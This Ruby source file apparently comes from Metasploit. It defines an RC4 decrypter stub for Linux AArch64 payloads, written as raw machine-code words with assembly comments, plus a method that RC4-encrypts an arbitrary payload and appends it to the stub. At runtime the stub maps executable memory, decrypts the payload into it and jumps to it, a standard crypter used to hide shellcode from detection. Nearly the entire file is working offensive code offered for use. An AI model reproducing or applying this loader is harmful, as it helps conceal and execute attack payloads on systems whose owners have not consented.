module Msf::Payload::Linux::Aarch64::Rc4Decrypter

  def rc4_decrypter_stub(key_size: 0, payload_size: 0, encrypted_size: 0)
    key_size_lo       = key_size & 0xffff
    key_size_hi       = (key_size >> 16) & 0xffff
    payload_size_lo   = payload_size & 0xffff
    payload_size_hi   = (payload_size >> 16) & 0xffff
    encrypted_size_lo = encrypted_size & 0xffff
    encrypted_size_hi = (encrypted_size >> 16) & 0xffff

    [
      # mmap(NULL, payload_size, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)
      (0xd2800001 | (payload_size_lo << 5)),    # 0x00: mov x1, #<payload_size_lo>
      (0xf2a00001 | (payload_size_hi << 5)),    # 0x04: movk x1, #<payload_size_hi>, lsl #16
      0xd2800000,                               # 0x08: mov x0, #0
      0xd28000e2,                               # 0x0c: mov x2, #7
      0xd2800443,                               # 0x10: mov x3, #34
      0x92800004,                               # 0x14: mov x4, #-1
      0xd2800005,                               # 0x18: mov x5, #0
      0xd2801bc8,                               # 0x1c: mov x8, #222
      0xd4000001,                               # 0x20: svc #0
      0xaa0003f4,                               # 0x24: mov x20, x0

      # initialize S-box: S[i] = i for i = 0..255
      0xd10403ff,                               # 0x28: sub sp, sp, #256
      0x910003e1,                               # 0x2c: mov x1, sp
      0xd2800002,                               # 0x30: mov x2, #0
      0x38226822,                               # 0x34: strb w2, [x1, x2]
      0x91000442,                               # 0x38: add x2, x2, #1
      0xf104005f,                               # 0x3c: cmp x2, #256
      0x54ffffa1,                               # 0x40: b.ne 0x34

      # RC4 Key Scheduling Algorithm (KSA)
      0x10000600,                               # 0x44: adr x0, 0x104
      (0xd2800001 | (key_size_lo << 5)),        # 0x48: mov x1, #<key_size_lo>
      (0xf2a00001 | (key_size_hi << 5)),        # 0x4c: movk x1, #<key_size_hi>, lsl #16
      0x910003e2,                               # 0x50: mov x2, sp
      0xd2800003,                               # 0x54: mov x3, #0
      0xd2800004,                               # 0x58: mov x4, #0

      # KSA loop: for i = 0..255
      0x38636845,                               # 0x5c: ldrb w5, [x2, x3]
      0x8b050084,                               # 0x60: add x4, x4, x5
      0x9ac10866,                               # 0x64: udiv x6, x3, x1
      0x9b018cc6,                               # 0x68: msub x6, x6, x1, x3
      0x38666807,                               # 0x6c: ldrb w7, [x0, x6]
      0x8b070084,                               # 0x70: add x4, x4, x7
      0x92401c84,                               # 0x74: and x4, x4, #255
      0x38636845,                               # 0x78: ldrb w5, [x2, x3]
      0x38646846,                               # 0x7c: ldrb w6, [x2, x4]
      0x38236846,                               # 0x80: strb w6, [x2, x3]
      0x38246845,                               # 0x84: strb w5, [x2, x4]
      0x91000463,                               # 0x88: add x3, x3, #1
      0xf104007f,                               # 0x8c: cmp x3, #256
      0x54fffe61,                               # 0x90: b.ne 0x5c

      # RC4 Pseudo-Random Generation Algorithm (PRGA)
      0x10000b80,                               # 0x94: adr x0, 0x204
      0xaa1403e1,                               # 0x98: mov x1, x20
      (0xd2800002 | (encrypted_size_lo << 5)),  # 0x9c: mov x2, #<encrypted_size_lo>
      (0xf2a00002 | (encrypted_size_hi << 5)),  # 0xa0: movk x2, #<encrypted_size_hi>, lsl #16
      0x910003e3,                               # 0xa4: mov x3, sp
      0xd2800004,                               # 0xa8: mov x4, #0
      0xd2800005,                               # 0xac: mov x5, #0
      0xd2800006,                               # 0xb0: mov x6, #0

      # PRGA loop: for k = 0..encrypted_size-1
      0x91000484,                               # 0xb4: add x4, x4, #1
      0x92401c84,                               # 0xb8: and x4, x4, #255
      0x38646867,                               # 0xbc: ldrb w7, [x3, x4]
      0x8b0700a5,                               # 0xc0: add x5, x5, x7
      0x92401ca5,                               # 0xc4: and x5, x5, #255
      0x38656868,                               # 0xc8: ldrb w8, [x3, x5]
      0x38246868,                               # 0xcc: strb w8, [x3, x4]
      0x38256867,                               # 0xd0: strb w7, [x3, x5]
      0x8b0800e9,                               # 0xd4: add x9, x7, x8
      0x92401d29,                               # 0xd8: and x9, x9, #255
      0x3869686a,                               # 0xdc: ldrb w10, [x3, x9]
      0x3866680b,                               # 0xe0: ldrb w11, [x0, x6]
      0x4a0b014a,                               # 0xe4: eor w10, w10, w11
      0x3826682a,                               # 0xe8: strb w10, [x1, x6]
      0x910004c6,                               # 0xec: add x6, x6, #1
      0xeb0200df,                               # 0xf0: cmp x6, x2
      0x54fffe01,                               # 0xf4: b.ne 0xb4

      # epilogue
      0x910403ff,                               # 0xf8: add sp, sp, #256
      0xaa1403e0,                               # 0xfc: mov x0, x20
      0xd61f0000,                               # 0x100: br x0
    ].pack('V*')
  end

  def rc4_decrypter(opts = {})
    key            = opts[:key] || Rex::Text.rand_text(16)
    payload        = opts[:data] || raise(ArgumentError, "Payload data required")
    raise(ArgumentError, "Key must be <= 256 bytes") if key.length > 256

    encrypted_data = Rex::Crypto::Rc4.rc4(key, payload)

    stub = rc4_decrypter_stub(
      key_size:       key.length,
      payload_size:   payload.length,
      encrypted_size: encrypted_data.length
    )

    stub << key.ljust(256, "\x00")
    stub << encrypted_data
  end

end